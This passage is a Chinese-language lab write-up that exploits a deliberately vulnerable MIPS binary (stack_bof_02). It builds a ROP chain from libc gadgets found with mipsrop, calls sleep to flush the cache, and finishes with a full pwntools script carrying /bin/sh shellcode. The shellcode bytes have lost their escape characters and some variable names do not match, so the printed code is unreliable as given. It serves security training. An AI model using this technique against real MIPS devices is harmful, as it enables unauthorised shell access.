函数内部使用了($s0-$s7)这些寄存器，需在函数开头将其保存到栈中（sw $sN, offset($sp)  
），并在返回前恢复（lw $sN, offset($sp)  
）。  
  
而临时寄存器($t0-$t9)无需保存，调用者需假设其值在函数调用后可能被破坏。  
  
若main  
函数未使用s  
0−s7，则无需在栈帧中保存/恢复这些寄存器，因此末尾不会有lw $s0, offset($sp)  
类指令。  
  
所以由于main  
函数末尾没有lw $s1, offset($sp)  
，攻击者无法通过覆盖栈上保存的$s1旧值来直接控制该寄存器。  
  
所以，无法直接控制$s1寄存器  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQKYFtsjcZObzHqmVzibW3EHhn27HLsmt8B939QfgvNKgo0ibDFOicia0vwAw/640?wx_fmt=png&from=appmsg "")  
  
需通过其他途径间接控制$s1，比如说，利用其他函数中的gadget恢复$s1，或者是通过数据传递链，比如move  
指令，将可控寄存器的值传递到$s1  
  
所以还是通过mipsrop.find(“lw $s1”)找到了一些gadget 0x00006A50  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQKA5pgp4wibFiaOWS7icsAElPXDYfhNp4PdpDsOceG3VynMT0SbtTNicCKGw/640?wx_fmt=png&from=appmsg "")  
  
  
理一下逻辑，使用gadget2=0x00006A50这段gadget设置好寄存器，修改好$s1的值，然后使用gadget1=0x0002FB10这段gadget去刷新数据区  
  
同时还是要找到libc的地址，由上一题可知，libc基地址为0x7f6e5000  
  
所以gadget1=0x7f6e5000+0x0002fb10=0x7f714b10  
  
gadget2=0x00006a50+0x7f6e5000=0x7f6eba50  
  
并且由ida可知调整shellcode的位置为0x58  
```
gadget1=0x7f714b10
gadget2=0x7f6eba50
payload="a"*508
payload+=p32(gadget2)
payload+="a"*0x58
payload+="aaaa"#覆盖s0
payload+="aaaa"#覆盖s1
payload+="aaaa"#覆盖s2
payload+=p32(gadget1)
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQKvFFGcAcQDO96zwuV46HYdhHwicOfUkhtc8x5PxxW84TWQC4ml3pibpTg/640?wx_fmt=png&from=appmsg "")  
  
  
由ida可知，sleep静态地址为0x0002F2B0，再加上libc_addr的话就为0x7F7142B0  
  
但是不能把sleep地址直接写到s1上，因为当这里填入sleep函数的地址后，程序会直接跳转执行sleep函数，但由于$ra寄存器仍保留着gadget1的地址，在sleep函数执行完毕后又会重新返回到当前位置。因此，需要寻找一个具备双重功能的gadget3——它既能通过s0或s  
2寄存器实现跳转控制，同时又能够对ra寄存器进行重新赋值，通过mipsrop.tail()找到的gadget3 0x00020F1C+libc_addr=0x7f705f1c  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQKhLn4HzONRTZkl9kAiadADyF1oWc1TMLLAECia3yIhsI5Klyv6EuzJ6Jg/640?wx_fmt=png&from=appmsg "")  
  
```
gadget1=0x7f714b10
gadget2=0x7f6eba50
gadget3=0x7f705f1c
sleep_addr=0x7f7142b0
payload="a"*508
payload+=p32(gadget2)
payload+="b"*0x58
payload+="cccc"#覆盖s0
payload+=p32(gadget3)#覆盖s1
payload+=p32(sleep)#覆盖s2，写入sleep
payload+=p32(gadget1)

payload+="c"*0x18#gadget3需要调整的shellcode位置的字节码
payload+="aaaa"#覆盖$s0
payload+="aaaa"#覆盖$s1
payload+="aaaa"#覆盖$s2
payload+="aaaa"#覆盖$ra
```  
  
sleep函数执行完之后，得找一个可以跳转的地址，并且在那上面可以写shellcode  
  
不过没有找到，在师傅建议下，找了一个可以先控制寄存器上的值，再跳转到这里，通过mipsrop.stackerfind()，gadget4=0x00016dd0+libc_addr=0x7f6fbdd0  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQKL3pYIMkaYbglBib1qhJAhpiak14zibhU9omXjdvHmIaM1ibLzVnn00byKw/640?wx_fmt=png&from=appmsg "")  
  
```
gadget1=0x7f714b10
gadget2=0x7f6eba50
gadget3=0x7f705f1c
gadget4=0x7f6fbdd0
sleep_addr=0x7f7142b0
payload="a"*508
payload+=p32(gadget2)
payload+="b"*0x58
payload+="cccc"#覆盖s0
payload+=p32(gadget3)#覆盖s1
payload+=p32(sleep)#覆盖s2，写入sleep
payload+=p32(gadget1)

payload+="c"*0x18#gadget3需要调整的shellcode位置的字节码
payload+="aaaa"#覆盖$s0
payload+="aaaa"#覆盖$s1
payload+="aaaa"#覆盖$s2
payload+=p32(gadget4)#覆盖$ra
```  
  
从ida显示的0x00016dd0可知，我们还得找一个可以利用$a0跳转的gadget5，直接简单粗暴 mipsrop.find(“move $t9,$a0”) gadget5=0x000214A0+libc_addr=0x7f7064a0  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQKvZ1sjX61uCxrkxoDS998jD2dQta3wMNjeVia5JU0PtZdt6UrI53dulg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQK7LBky3k8BbpAsNZ36E01n3zf4cUVoqmicJGAnFtz3WVdVibudpS1RWxg/640?wx_fmt=png&from=appmsg "")  
```
gadget1=0x7f714b10
gadget2=0x7f6eba50
gadget3=0x7f705f1c
gadget4=0x7f6fbdd0
gadget5=0x7f7064a0
sleep_addr=0x7f7142b0
payload="a"*508
payload+=p32(gadget2)
payload+="b"*0x58
payload+="cccc"#覆盖s0
payload+=p32(gadget3)#覆盖s1
payload+=p32(sleep)#覆盖s2，写入sleep
payload+=p32(gadget1)

payload+="c"*0x18#gadget3需要调整的shellcode位置的字节码
payload+=p32(gadget5)#覆盖$s0
payload+="aaaa"#覆盖$s1
payload+="aaaa"#覆盖$s2
payload+=p32(gadget4)#覆盖$ra

payload+="f"*0x18
payload += p32(0xdeadbeef)
payload += shellcode
```  
  
随便找了个网站生成了一段小端的shellcode  
```
shellcode =“”
shellcode +="xffxffx06x28"# slti $a2, $zero, -1
shellcode +="x62x69x0fx3c"# lui $t7, 0x6962
shellcode +="x2fx2fxefx35"# ori $t7, $t7, 0x2f2f
shellcode +="xf4xffxafxaf"# sw $t7, -0xc($sp)
shellcode+="x73x68x0ex3c"# lui $t6, 0x6873
shellcode +="x6ex2fxcex35"# ori $t6, $t6, 0x2f6e
shellcode +="xf8xffxaexaf"# sw $t6, -8($sp)
shellcode +="xfcxffxa0xaf"# sw $zero, -4($sp)
shellcode +="xf4xffxa4x27"# addiu $a0, $sp, -0xc
shellcode +="xffxffx05x28"# slti $a1, $zero, -1
shellcode +="xabx0fx02x24"# addiu;$v0, $zero, 0xfab
shellcode +="x0cx01x01x01"# syscall 0x40404
```  
  
完整的payload  
```
from pwn import*
context.binary ="./pwnable/ShellCode_Required/stack_bof_02"
context.arch ="mips"
context.endian ="little"
gadget1=0x7f714b10
gadget2=0x7f6eba50
gadget3=0x7f705f1c
gadget4=0x7f6fbdd0
gadget5=0x7f7064a0
sleep_addr=0x7f7142b0

shellcode =“”
shellcode +="xffxffx06x28"# slti $a2, $zero, -1
shellcode +="x62x69x0fx3c"# lui $t7, 0x6962
shellcode +="x2fx2fxefx35"# ori $t7, $t7, 0x2f2f
shellcode +="xf4xffxafxaf"# sw $t7, -0xc($sp)
shellcode+="x73x68x0ex3c"# lui $t6, 0x6873
shellcode +="x6ex2fxcex35"# ori $t6, $t6, 0x2f6e
shellcode +="xf8xffxaexaf"# sw $t6, -8($sp)
shellcode +="xfcxffxa0xaf"# sw $zero, -4($sp)
shellcode +="xf4xffxa4x27"# addiu $a0, $sp, -0xc
shellcode +="xffxffx05x28"# slti $a1, $zero, -1
shellcode +="xabx0fx02x24"# addiu;$v0, $zero, 0xfab
shellcode +="x0cx01x01x01"# syscall 0x40404

payload="a"*508
payload+=p32(gadget2)
payload+="b"*0x58
payload+="cccc"#覆盖s0
payload+=p32(gadget3)#覆盖s1
payload+=p32(sleep)#覆盖s2，写入sleep
payload+=p32(gadget1)

payload+="c"*0x18#gadget3需要调整的shellcode位置的字节码
payload+=p32(gadget5)#覆盖$s0
payload+="aaaa"#覆盖$s1
payload+="aaaa"#覆盖$s2
payload+=p32(gadget4)#覆盖$ra

payload+="f"*0x18
payload += p32(0xdeadbeef)
payload += shellcode

with open("stack_bof_02_pyload","w")as file:
    file.write(payload)
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldzgr2BfvRHQPINwcTfnsPQKtjE0DiblcN63eEibicsZKU7kSOOF59puLa74zx5x7DHYkB22E1ibWLBtHQ/640?wx_fmt=png&from=appmsg "")  
  
  
这道题最重要的就是学到mipsrop链的构造  
## 参考文章  
  
https://www.mrskye.cn/archives/6f13cd09/#stack-bof-02  
  
https://www.anquanke.com/post/id/184718#h3-10  
  
https://www.pnfsoftware.com/blog/firmware-exploitation-with-jeb-part-2/  
  
  
[](https://mp.weixin.qq.com/s?__biz=MzkxNTIwNTkyNg==&mid=2247549615&idx=1&sn=5de0fec4a85adc4c45c6864eec2c5c56&scene=21#wechat_redirect)  
  
